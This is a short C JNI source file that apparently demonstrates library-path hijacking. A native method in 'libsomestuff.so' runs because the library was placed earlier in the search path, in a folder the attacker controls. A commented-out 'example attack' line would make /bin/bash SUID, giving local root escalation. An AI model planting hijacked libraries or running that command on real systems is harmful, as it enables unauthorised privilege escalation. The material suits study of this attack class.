#include "malicious.h"

// Implementation of the native method sayHello()
JNIEXPORT void JNICALL Java_LoadLibraryTest_sayHello(JNIEnv *env, jobject thisObj) {
   printf("Hello from my malicious.cpp, which I compiled to `libsomestuff.so`\n");
   printf("This will execute because I put it higher up the library path in a folder I control");

   // Example Attack: make /bin/bash a SUID
   // system("chmod u+s /bin/bash");
}
